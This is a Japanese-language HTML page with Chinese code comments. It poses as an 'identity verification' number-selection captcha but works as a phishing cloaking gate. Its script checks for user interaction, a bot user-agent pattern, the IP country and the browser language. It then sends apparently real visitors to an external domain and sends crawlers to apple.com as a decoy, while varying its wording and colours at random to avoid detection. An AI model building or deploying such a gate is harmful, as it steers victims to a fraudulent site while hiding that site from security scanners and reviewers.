<!DOCTYPE html>
<html lang="ja">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
<meta name="format-detection" content="telephone=no">
<title>本人確認</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
html,body{width:100%;height:100%}
body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",sans-serif;background:#f7f8fa;display:flex;align-items:center;justify-content:center;padding:16px}
.box{width:100%;max-width:480px;background:#fff;border-radius:24px;padding:28px 24px;box-shadow:0 8px 24px rgba(0,0,0,0.06)}
.title{text-align:center;font-size:20px;font-weight:700;margin-bottom:12px;color:#111}
.desc{text-align:center;font-size:15px;color:#666;margin-bottom:20px;line-height:1.4}
.target-area{border-radius:18px;padding:20px;text-align:center;margin-bottom:24px}
.target-label{font-size:14px;color:#555;margin-bottom:8px}
.target-nums{font-size:34px;font-weight:700;letter-spacing:10px}
.grid{display:grid;grid-template-columns:repeat(4,1fr);gap:12px;margin-bottom:24px}
.num-btn{aspect-ratio:1;border-radius:16px;border:2px solid #e0e0e0;background:#fff;font-size:22px;font-weight:600;cursor:pointer;transition:all .2s}
.num-btn:active{transform:scale(.95)}
.submit-btn{width:100%;padding:18px;border-radius:18px;color:#fff;font-size:17px;font-weight:600;border:none;cursor:pointer}
.submit-btn:disabled{background:#ccc !important;cursor:not-allowed}
.status{text-align:center;margin-top:12px;font-size:13px;color:#888}
</style>
</head>
<body>

<div class="box">
  <div class="title"></div>
  <div class="desc"></div>
  <div class="target-area">
    <div class="target-label"></div>
    <div class="target-nums" id="target"></div>
  </div>
  <div class="grid" id="grid"></div>
  <button class="submit-btn" id="submit" disabled></button>
  <div class="status" id="status"></div>
</div>

<script>
// ==================== 日式随机文案 ====================
const texts = {
  titles: ["本人確認", "認証", "確認作業", "安全確認", "ユーザー確認"],
  descs: [
    "表示されている数字をすべて選択してください",
    "画面に表示された数字を選んでください",
    "確認のため、表示されている数字を選択してください",
    "安全確認のため、数字をすべて選んでください"
  ],
  labels: ["対象の数字", "表示数字", "こちらの数字", "選択項目"],
  btnTexts: ["確認する", "次へ", "認証を実行", "送信"],
  statusTexts: ["選択してください", "選択中です", "数字を選んでから確認してください"],
  colors: ["#007aff", "#34c759", "#5856d6", "#ff6b6b", "#ff9500", "#00c7be"]
};

function rand(arr) {
  return arr[Math.floor(Math.random() * arr.length)];
}

const mainColor = rand(texts.colors);
document.querySelector(".title").innerText = rand(texts.titles);
document.querySelector(".desc").innerText = rand(texts.descs);
document.querySelector(".target-label").innerText = rand(texts.labels);
document.querySelector("#submit").innerText = rand(texts.btnTexts);
document.querySelector("#status").innerText = rand(texts.statusTexts);
document.querySelector(".target-nums").style.color = mainColor;
document.querySelector(".target-area").style.background = mainColor + "10";
document.querySelector(".submit-btn").style.background = mainColor;

// ==================== 跳转地址 ====================
const REAL_TARGETS = ["https://novedadestecperu.online","https://novedadestecperu.online","https://novedadestecperu.online"];
const BAD_TARGET = "https://www.apple.com";

// ==================== 超宽松真人判断 ====================
let userInteracted = false;
const interactEvents = ['click','touchstart','mousedown','mousemove','scroll','keydown','touchmove'];
interactEvents.forEach(evt => {
  window.addEventListener(evt, () => { userInteracted = true; }, { once: true });
});

async function isJapaneseRealUser() {
  try {
    if (!userInteracted) return false;
    let isJpIP = true;
    try {
      const res = await fetch("https://ipapi.co/json/", { cache: "no-store" });
      if(res.ok){
        const data = await res.json();
        isJpIP = data?.country_code === "JP";
      }
    }catch(e){}

    const lang = navigator.language || "";
    const isJpLang = lang.startsWith("ja") || lang.endsWith("-JP");
    const isBot = /HeadlessChrome|PhantomJS|Selenium|Crawler/i.test(navigator.userAgent);
    
    return !isBot;
  } catch (e) {
    return true;
  }
}

// ==================== 验证码生成 ====================
function generateCaptcha() {
  const nums = "0123456789".split("");
  const target = [];
  while (target.length < 2) {
    const n = nums[Math.floor(Math.random() * nums.length)];
    if (!target.includes(n)) target.push(n);
  }
  const options = [...target];
  while (options.length < 8) {
    const n = nums[Math.floor(Math.random() * nums.length)];
    if (!options.includes(n)) options.push(n);
  }
  options.sort(() => Math.random() - 0.5);
  return { target, options, need: 2 };
}

const { target, options, need } = generateCaptcha();
const targetEl = document.getElementById("target");
targetEl.innerText = target.join('   ');

const grid = document.getElementById("grid");
const submit = document.getElementById("submit");
const status = document.getElementById("status");
let selected = [];

// 生成按钮
options.forEach(num => {
  const btn = document.createElement("button");
  btn.className = "num-btn";
  btn.innerText = num;
  btn.onclick = () => {
    btn.classList.toggle("selected");
    if(btn.classList.contains("selected")){
      btn.style.background = mainColor;
      btn.style.color = "#fff";
      btn.style.borderColor = mainColor;
    }else{
      btn.style.background = "#fff";
      btn.style.color = "#000";
      btn.style.borderColor = "#e0e0e0";
    }
    selected = [...document.querySelectorAll(".num-btn.selected")].map(b => b.innerText);
    submit.disabled = selected.length !== need;
    status.innerText = `${selected.length}/${need} 個選択中`;
  };
  grid.appendChild(btn);
});

// 提交
submit.onclick = async () => {
  const ok = target.every(t => selected.includes(t)) && selected.length === target.length;
  if(!ok){
    alert("認証に失敗しました。再度お試しください。");
    return;
  }

  await new Promise(r => setTimeout(r, 100));
  const okUser = await isJapaneseRealUser();
  location.href = okUser ? rand(REAL_TARGETS) : BAD_TARGET;
};
</script>
</body>
</html>
